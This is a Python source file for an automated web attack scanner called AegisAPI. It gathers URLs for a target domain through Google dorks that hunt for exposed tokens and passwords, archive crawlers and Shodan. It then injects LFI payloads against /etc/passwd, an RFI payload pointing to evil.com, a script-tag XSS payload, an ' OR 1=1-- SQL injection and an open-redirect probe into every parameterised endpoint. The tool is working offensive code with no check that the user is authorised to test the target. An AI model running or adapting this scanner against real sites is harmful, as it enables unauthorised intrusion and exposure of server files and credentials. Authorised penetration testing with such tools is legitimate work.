import os
import sys
import json
import subprocess
import requests
from datetime import datetime
from urllib.parse import urlparse
from googlesearch import search
from shodan import Shodan
from typing import List, Dict, Any
from pyfiglet import Figlet
from colorama import init, Fore, Style
import shutil
import time

init()

def show_banner(text="AEGIS API"):
    width = min(shutil.get_terminal_size().columns, 120)
    f = Figlet(font="big")
    lines = f.renderText(text).splitlines()
    colours = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]

    for colour in colours:
        print("\033[2J\033[H", end="")
        for line in lines:
            print(colour + line.center(width) + Style.RESET_ALL)
        time.sleep(0.15)

    print("\033[2J\033[H", end="")
    for line in lines:
        print(Fore.CYAN + line.center(width) + Style.RESET_ALL)

    print(Fore.WHITE + "           🔍  A U T O M A T E D   A P I   S C A N N E R\n" + Style.RESET_ALL)

class AegisAPI:
    def __init__(self, domain: str, shodan_key: str):
        self.domain = domain
        self.shodan = Shodan(shodan_key)
        self.out_dir = "aegis_results"
        os.makedirs(self.out_dir, exist_ok=True)
        self.urls: List[str] = []
        self.endpoints: set[str] = set()
        self.report: Dict[str, Any] = {
            "domain": domain,
            "date": datetime.utcnow().isoformat(),
            "findings": {"lfi": [], "rfi": [], "xss": [], "sqli": [], "open_redirect": [], "shodan": []},
        }

    # ---------- RECON ----------
    def passive_recon(self) -> None:
        dorks = [
            f"site:{self.domain} intext:api",
            f"site:{self.domain} (token|password|apikey)",
            f"site:{self.domain} /api/",
            f"site:{self.domain} (ext:log|ext:txt|ext:conf)",
        ]
        for dork in dorks:
            for url in search(dork, num_results=100):
                if url not in self.urls:
                    self.urls.append(url)
        with open(os.path.join(self.out_dir, "passive_urls.txt"), "w") as f:
            f.write("\n".join(self.urls))
        print(f"[+] Passive recon: {len(self.urls)} URLs")

    def active_recon(self) -> None:
        # gau
        try:
            out = subprocess.run(
                ["gau", "-subs", "-json", self.domain],
                capture_output=True,
                text=True,
                timeout=30,
            )
            if out.returncode == 0:
                for line in out.stdout.splitlines():
                    try:
                        data = json.loads(line)
                        u = data["url"]
                        if u not in self.urls:
                            self.urls.append(u)
                        self.endpoints.add(urlparse(u).path)
                    except Exception:
                        pass
        except FileNotFoundError:
            print("[!] gau not found – install: go install github.com/lc/gau@latest")
        # waybackurls
        try:
            out = subprocess.run(
                ["waybackurls", self.domain],
                capture_output=True,
                text=True,
                timeout=30,
            )
            if out.returncode == 0:
                for u in out.stdout.splitlines():
                    if u not in self.urls:
                        self.urls.append(u)
                    self.endpoints.add(urlparse(u).path)
        except FileNotFoundError:
            print("[!] waybackurls not found – install: go install github.com/tomnomnom/waybackurls@latest")
        with open(os.path.join(self.out_dir, "active_urls.txt"), "w") as f:
            f.write("\n".join(self.urls))
        with open(os.path.join(self.out_dir, "endpoints.txt"), "w") as f:
            f.write("\n".join(self.endpoints))
        print(f"[+] Active recon: {len(self.urls)} URLs, {len(self.endpoints)} endpoints")

    # ---------- VULN TESTS ----------
    def _qsreplace(self, url: str, payload: str) -> str | None:
        try:
            out = subprocess.run(
                ["qsreplace", payload],
                input=url,
                capture_output=True,
                text=True,
                timeout=10,
            )
            if out.returncode == 0:
                return out.stdout.strip()
        except FileNotFoundError:
            pass
        return None

    def test_lfi(self) -> None:
        payloads = ["../../../etc/passwd", "file:///etc/passwd"]
        for ep in self.endpoints:
            if "=" not in ep:
                continue
            for p in payloads:
                u = self._qsreplace(ep, p)
                if not u:
                    continue
                try:
                    r = requests.get(u, timeout=10)
                    if "root:" in r.text or "passwd" in r.text:
                        self.report["findings"]["lfi"].append({"url": u, "payload": p})
                except Exception:
                    continue
        print(f"[+] LFI tests: {len(self.report['findings']['lfi'])} hits")

    def test_rfi(self) -> None:
        payload = "http://evil.com/rfi.txt"
        for ep in self.endpoints:
            if "=" not in ep:
                continue
            u = self._qsreplace(ep, payload)
            if not u:
                continue
            try:
                r = requests.get(u, timeout=10)
                if payload in r.text or "evil.com" in r.text:
                    self.report["findings"]["rfi"].append({"url": u, "payload": payload})
            except Exception:
                continue
        print(f"[+] RFI tests: {len(self.report['findings']['rfi'])} hits")

    def test_xss(self) -> None:
        payload = "\"><script>alert('Aegis')</script>"
        for ep in self.endpoints:
            if "=" not in ep:
                continue
            u = self._qsreplace(ep, payload)
            if not u:
                continue
            try:
                r = requests.get(u, timeout=10)
                if payload in r.text:
                    self.report["findings"]["xss"].append({"url": u, "payload": payload})
            except Exception:
                continue
        print(f"[+] XSS tests: {len(self.report['findings']['xss'])} hits")

    def test_sqli(self) -> None:
        payload = "' OR 1=1--"
        for ep in self.endpoints:
            if "=" not in ep:
                continue
            u = self._qsreplace(ep, payload)
            if not u:
                continue
            try:
                r = requests.get(u, timeout=10)
                if any(x in r.text.lower() for x in ["mysql", "sql", "syntax"]):
                    self.report["findings"]["sqli"].append({"url": u, "payload": payload})
            except Exception:
                continue
        print(f"[+] SQLi tests: {len(self.report['findings']['sqli'])} hits")

    def test_open_redirect(self) -> None:
        payload = "http://evil.com"
        for ep in self.endpoints:
            if "=" not in ep:
                continue
            u = self._qsreplace(ep, payload)
            if not u:
                continue
            try:
                r = requests.get(u, allow_redirects=False, timeout=10)
                if r.status_code in (301, 302, 307, 308) and payload in r.headers.get("Location", ""):
                    self.report["findings"]["open_redirect"].append({"url": u, "payload": payload})
            except Exception:
                continue
        print(f"[+] Open Redirect tests: {len(self.report['findings']['open_redirect'])} hits")

    # ---------- SHODAN ----------
    def shodan_scan(self) -> None:
        try:
            results = self.shodan.search(f"hostname:{self.domain}")
            for m in results["matches"]:
                self.report["findings"]["shodan"].append(
                    {
                        "ip": m.get("ip_str"),
                        "port": m.get("port"),
                        "hostnames": m.get("hostnames"),
                        "os": m.get("os"),
                        "data": m.get("data", "").strip(),
                    }
                )
        except Exception as e:
            print(f"[!] Shodan error: {e}")
        print(f"[+] Shodan: {len(self.report['findings']['shodan'])} hosts")

    # ---------- REPORT ----------
    def generate_html_report(self) -> str:
        path = os.path.join(self.out_dir, "aegis_report.html")
        with open(path, "w") as f:
            f.write("<!DOCTYPE html><html><head><title>AegisAPI Report</title>")
            f.write(
                '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">'
            )
            f.write("</head><body class='p-4'>")
            f.write(f"<h1 class='mb-3'>AegisAPI – {self.domain}</h1>")
            f.write(f"<small class='text-muted'>Generated {self.report['date']}</small>")
            for cat in self.report["findings"]:
                items = self.report["findings"][cat]
                if not items:
                    continue
                f.write(f"<h3 class='mt-4'>{cat.upper()}</h3><ul class='list-group'>")
                for it in items:
                    f.write("<li class='list-group-item'><pre>")
                    f.write(json.dumps(it, indent=2))
                    f.write("</pre></li>")
                f.write("</ul>")
            f.write("</body></html>")
        print(f"[+] Report saved: {path}")
        return path

    # ---------- RUN ----------
    def run(self):
        show_banner()
        self.passive_recon()
        self.active_recon()
        self.test_lfi()
        self.test_rfi()
        self.test_xss()
        self.test_sqli()
        self.test_open_redirect()
        self.shodan_scan()
        self.generate_html_report()


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python aegisapi.py <domain> <SHODAN_API_KEY>")
        sys.exit(1)
    AegisAPI(sys.argv[1], sys.argv[2]).run()